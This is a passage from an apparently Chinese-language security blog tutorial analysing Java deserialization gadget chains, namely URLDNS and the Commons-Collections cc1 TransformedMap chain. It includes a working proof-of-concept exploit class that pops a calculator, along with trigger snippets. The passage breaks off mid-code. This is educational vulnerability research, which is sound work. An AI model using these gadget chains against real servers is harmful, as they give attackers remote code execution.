alt="image-20210511193717145"></p><p>对于主干来说，当要存放一个entry的时候，步骤如下：</p><ol><li>计算key的hash：hash(k)</li><li>通过hash(k)映射到有限的数组a的位置i</li><li>在a[i]的位置存入value</li></ol><p>自然就会想到，<strong>如果哈希冲突了怎么办？</strong>HashMap对于不同的元素，如果hash值相同，会采用链表指针的方式来挂在后面。</p><blockquote><p><strong>HashMap的主干是一个Entry数组</strong>，主干数组的长度一定是2的次幂。</p><p>Entry是HashMap的基本组成单元，每一个Entry包含一个key-value键值对。（其实所谓Map其实就是保存了两个对象之间的映射关系的一种集合）</p></blockquote><p>看源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//jdk7</span></span><br><span class="line"><span class="keyword">transient</span> Entry&lt;K,V&gt;[] table = (Entry&lt;K,V&gt;[]) EMPTY_TABLE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Entry是HashMap中的一个静态内部类。</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> K key;</span><br><span class="line">  V value;</span><br><span class="line">  Entry&lt;K,V&gt; next;<span class="comment">//存储指向下一个Entry的引用，单链表结构</span></span><br><span class="line">  <span class="keyword">int</span> hash;<span class="comment">//对key进行hash运算后得到的值，存储在Entry中，避免重复计算</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Creates new entry.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  Entry(<span class="keyword">int</span> h, K k, V v, Entry&lt;K,V&gt; n) &#123;</span><br><span class="line">    value = v;</span><br><span class="line">    next = n;</span><br><span class="line">    key = k;</span><br><span class="line">    hash = h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看图：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511195908151.png" alt="image-20210511195908151"></p><h3 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h3><p>看源码（跳过一些初始化操作）：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511201023679.png" alt="image-20210511201023679"></p><p>putVal是向Map存放Entry的操作，在放入时会计算<strong>key的hash</strong>作为转化为数组位置<strong>i</strong>的映射依据。</p><p><strong>DNS查询正是在计算URL类的对象的hash的过程中触发的</strong>，即<strong>hash(key)</strong>。</p><p>看hash()方法源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511201250404.png" alt="image-20210511201250404"></p><p>不同对象的hash计算方法是在各自的类中实现的，如果传入的key是一个URL对象，这里key.hashCode()就会调用URL类中的hashCode方法：java.net.URL#hashCode。</p><p>java.net.URL#hashCode 源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511201521952.png" alt="image-20210511201521952"></p><p>仔细看，用到了两个field：</p><blockquote><p><strong>transient</strong> URLStreamHandler handler;  // handler是一个transient临时类型，它不会被反序列化（但之后会用到）</p><p><strong>private</strong> <strong>int</strong> hashCode = -1;   //hashCode是private类型，需要手动开放控制权才可以修改。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//如果hashCode不为-1，直接返回hashCode的值</span></span><br><span class="line">  <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line"><span class="comment">//如果hashCode为-1，直接计算handler的hashcode，并返回</span></span><br><span class="line">  hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那就继续看handler所属的类：URLStreamHandler</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511204935728.png" alt="image-20210511204935728"></p><p>getHostAddress也是限制了IP地址不会解析：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511205231393.png" alt="image-20210511205231393"></p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511231600583.png" alt="image-20210511231600583" style="zoom:50%;"><p>这里面必须提一下上面的hostAddress参数，<strong>如果 Host 字段为一个域名 , 且我们之前解析过这个域名 , 那么程序会将解析后的 IP 地址缓存到 hostAddress 参数中 , 当我们再次请求时 , 由于 hostAddress 已有值 , 就不会走完剩下的 POP Chain 了。</strong></p><p>继续跟，会到java.net.InetAddress#getAllByName()这个方法：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511232113101.png" alt="image-20210511232113101" style="zoom:50%;"><p>进入getAllByName0:</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511232345462.png" alt="image-20210511232345462"></p><p><strong>总结一下到目前为止可以利用的调用链</strong>：</p><ol><li>HashMap.readObject() -&gt; HashMap.hash() </li><li>HashMap.hash() -&gt; URL.hashCode()</li><li>URL.hashCode() -&gt; URLStreamHandler.hashCode()</li><li>URLStreamHandler.hashCode() -&gt; URLStreamHandler.getHostAddress()</li><li>URLStreamHandler.getHostAddress() -&gt; InetAddress.getByName() -&gt; … -&gt; getAddressFromNameService()</li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>满足两个条件：</p><ol><li>为了能走到URL.hashCode()，要保证map里面存放着一个Entry，这个Entry的key满足URL类型</li><li>为了能走到URLStreamHandler.hashCode()，需要hashCode这个field为-1，绕过if判断</li></ol><p>往前翻PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">f.set(url, <span class="number">0xdeadbeef</span>); </span><br><span class="line">hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">f.set(url, -<span class="number">1</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>为什么这里首先给url的hashCode属性先设置成一个值，put到map之后，再改成另一个值？</strong></p><p>这里我们先做一件事，看一下之前提到的HashMap.readObject()方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512000356313.png" alt="image-20210512000356313"></p><p>这里面的s其实是ObjectInputStream对象。既然key和value都是从s.readObejct()方法出来的(之后进行了cast强转)，那我们先看一下对应的HashMap.writeObject方法：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512000617960.png" alt="image-20210512000617960" style="zoom:50%;"><p>跟到internalWriteEntries方法：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512000702874.png" alt="image-20210512000702874" style="zoom:50%;"><p>可以看到，分别对entry内部的key和value进行了writeObject，tab的值即HashMap中table的值，也就是横向数组。</p><p>想一下，如果你想向一个HashMap中存放一个entry，那么就要执行HashMap.put()方法：</p><p>再看一下HashMap的put方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511224336952.png" alt="image-20210511224336952"></p><p>可以看到，这里用到了HashMap.hash()方法，如果这里面的key就是URL，那么后续利用链就能接上。</p><p>也就是说，<strong>仅仅一次put操作，就会触发一次DNS查询</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DNSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(your_dns_url);</span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">//此时就会产生一次dns查询</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就可以回答之前的问题：</p><p><strong>为什要改两次，因为我们要规避掉put操作产生的DNS查询。</strong></p><p>之后再改回-1，是为了可以成功触发反序列化时候的漏洞。</p><p>也就是这里还有一条小链：</p><blockquote><p>HashMap.put() -&gt; HashMap.hash() </p><p>HashMap.hash() -&gt; URL.hashCode()</p><p>…</p><p>触发DNS查询</p></blockquote><h2 id="ysoserial实现版本"><a href="#ysoserial实现版本" class="headerlink" title="ysoserial实现版本"></a>ysoserial实现版本</h2><p>十分优雅</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512003551060.png" alt="image-20210512003551060"></p><p>这里首先有一个SilentURLStreamHandler对象，跟进去看看：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512003709417.png" alt="image-20210512003709417" style="zoom:50%;"><p>可以发现这个类其实就是继承URLStreamHandler类，并且把这两个方法改成了返回null，这样就规避了在生成payload的时候的那一次DNS查询，也就是我们之前看到的HashMap.put的那次操作。</p><p>这次put的时候，由于handler是SilentURLStreamHandler类，完全不会出发DNS解析，实在是妙。</p><h1 id="Commons-Collections"><a href="#Commons-Collections" class="headerlink" title="Commons-Collections"></a>Commons-Collections</h1><p>“不是夸你们Oracle呢，CC链确实让我们没饿死”</p><p>这里主要是ysoserial已经有的cc1-7漏洞，以及记录一些其他师傅们发现的。</p><p>cc的背景可以去看之前的<a href="https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/">文章</a>温习。</p><h2 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h2><p>条件：</p><ul><li><p><strong>cc3.1～3.2.1</strong></p></li><li><p><strong>jdk 1.7</strong>(8u71之前都可以)</p></li></ul><p>maven：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>预备知识：</p><ul><li><a href="https://0range228.github.io/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/">动态代理</a>，一句话总结就是：<strong>动态代理直接调用接口的方法，无需实现类</strong>。</li><li><a href="https://0range228.github.io/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/">反射</a></li></ul><p>主流两个版本：TransformedMap，LazyMap</p><h3 id="TransformedMap版本"><a href="#TransformedMap版本" class="headerlink" title="TransformedMap版本"></a>TransformedMap版本</h3><p>PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1_TransformedMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChian</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他小型触发：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Map map = <span class="keyword">new</span> HashedMap();</span><br><span class="line">Map transformedMap = TransformedMap.decorate(map,chainedTransformer,<span class="keyword">null</span>);</span><br><span class="line">map1.put(<span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line"><span class="comment">//给予map数据转化链</span></span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发漏洞</span></span><br><span class="line">Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line"><span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">onlyElement.setValue(<span class="string">"foobar"</span>);</span><br></pre></td></tr></table></figure><h4 id="利用链寻找"><a href="#利用链寻找" class="headerlink" title="利用链寻找"></a>利用链寻找</h4><p>这里我想从漏洞挖掘的角度去写，毕竟这是个老洞，我们更应该关注的是如何找到的。</p><p>还是那句话，上来找readObject复写点，非常多！只不过我们现在关注TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512104425592.png" alt="image-20210512104425592" style="zoom:90%;"><p>翻看commons-collections的文档可以发现：</p><blockquote><p>该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换(transform)方法，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</p></blockquote><blockquote><p>举个例子获得一个TransformedMap的实例，可以通过TransformedMap.decorate()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map tansformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure><p>可以看到三个参数，map，keyTransformer，valueTransformer</p></blockquote><p>翻译过来：<strong>当TransformedMap内的key或者value发生变化时，就会触发相应参数的Transformer的transform()方法。</strong></p><p>其实这句话值得引起我们的怀疑，<strong>transform参数是否可控</strong>？</p><p>索性去找Transformer类，发现是一个接口，只有一个transform方法，find implementation(option+cmd+B)，一共14个：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512105022662.png" alt="image-20210512105022662"></p><p>先看第一个，ChainedTransformer：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512113116168.png" alt="image-20210512113116168"></p><p>这里的iTransformer属性是一个Transformer[]数组，并且发现在ChainTransformer的transform函数中，会依次对该数组里面的transformer依次进行transform方法(不同的Transformer实现类实现的transform不同，多态)。</p><p>而且这里有一个细节就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br></pre></td></tr></table></figure><p>这条语句放在了一个循环里面。</p><p>这也就<strong>导致上一次tranform方法的结果返回值会作为下一次transform的参数</strong>，越来越有链的感觉了！</p><p><strong>世界线展开</strong></p><p>这时候我们可以寻找invoke函数的调用点。</p><p>其实这里我认为我们始终离不开找invoke这样的sink点环节，碰巧发现在InvokeTransformer有invoke方法的使用：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512105446730.png" alt="image-20210512105446730" style="zoom:90%;"><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512105544347.png" alt="image-20210512105544347"></p><p>哦这熟悉的反射味道，血压拉满！</p><p>如果这里input是可控的，按逻辑走，会获得input的Class对象，下一步想获取method对象，但是发现有两个参数iMethodName和iParamTypes。</p><p>往前翻构造函数：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512110405704.png" alt="image-20210512110405704"></p><p><strong>InvokerTransformer类就是今天的主角，因为他有RCE触发点。</strong></p><p>InvokerTransformer这部分我们先按下不表，接下来就要寻找哪些方法可以调用InvokerTransformer类呢？逃不开之前找到的14个Transformer，因为他们实现了Transformer这个接口，都现实了transform方法。</p><p>我们接下来要找transform方法在哪被调用了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512114920825.png" alt="image-20210512114920825"></p><p>看TransformedMap内部：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512115236996.png" alt="image-20210512115236996"></p><p>只有这三处调用了transform方法。</p><p>前两个都是本类方法，但是第三个checkSetValue方法是一个抽象方法，属于AbstractInputCheckedMapDecorator的抽象方法，它一共有两个类实现，TransformedMap算一个：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512115852020.png" alt="image-20210512115852020"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512120730684.png" alt="image-20210512120730684"></p><p>查找checkSetValue方法在哪可以被调用，发现在内部类MapEntry的setValue方法中调用了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512134704165.png" alt="image-20210512134704165"></p><p>也就是说，<strong>只要一个类A继承了抽象类AbstractInputCheckedMapDecorator，那么A就会有内部类A.MapEntry，就可以A.MapEntry.setValue()执行方法。</strong></p><p><strong>我们的TransformedMap就是这样的一个A</strong></p><p>寻找实现AbstractInputCheckedMapDecorator的类，一共有4个：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512195129400.png" alt="image-20210512195129400"></p><p>正好TransformedMap算一个。所以它既是readObejct复写点又是执行链的起点</p><p><strong>世界线收束</strong></p><h4 id="构造PoC"><a href="#构造PoC" class="headerlink" title="构造PoC"></a>构造PoC</h4><p>经典一句话，弹计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app"</span>);</span><br></pre></td></tr></table></figure><p>反射写法：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>); </span><br><span class="line">clazz.getMethod("exec", String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz), "open /Applications/Calculator.app");</span><br></pre></td></tr></table></figure><p>不清楚的可以看之前的<a href="https://0range228.github.io/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/">博客</a></p><p>那现在要如何构造这句话呢？</p><p>首先上一部分我们发现了InvokerTransformer有invoke触发点，用反射来出发。</p><p>重要的是每个参数如何对应赋值，看InvokerTransformer的第二个构造方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512142534887.png" alt="image-20210512142534887"></p><p>我们“一句话”到执行函数是exec，回去看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512142625801.png" alt="image-20210512142625801"></p><p>exec的参数类型是String，所以InvokerTransformer构造函数的三个参数分别是：</p><ul><li>methodName = “exec” =&gt; iMethodName</li><li>paramTypes = “new Class[]{String.class}” =&gt; iParamtypes</li><li>iArgs = “new String[]{“open /Applications/Calculator.app”}” =&gt; iArgs</li></ul><p>所以尝试写一个demo1.0：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvokerTransformer it = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                new String[]&#123;"open /Applications/Calculator.app"&#125;</span><br><span 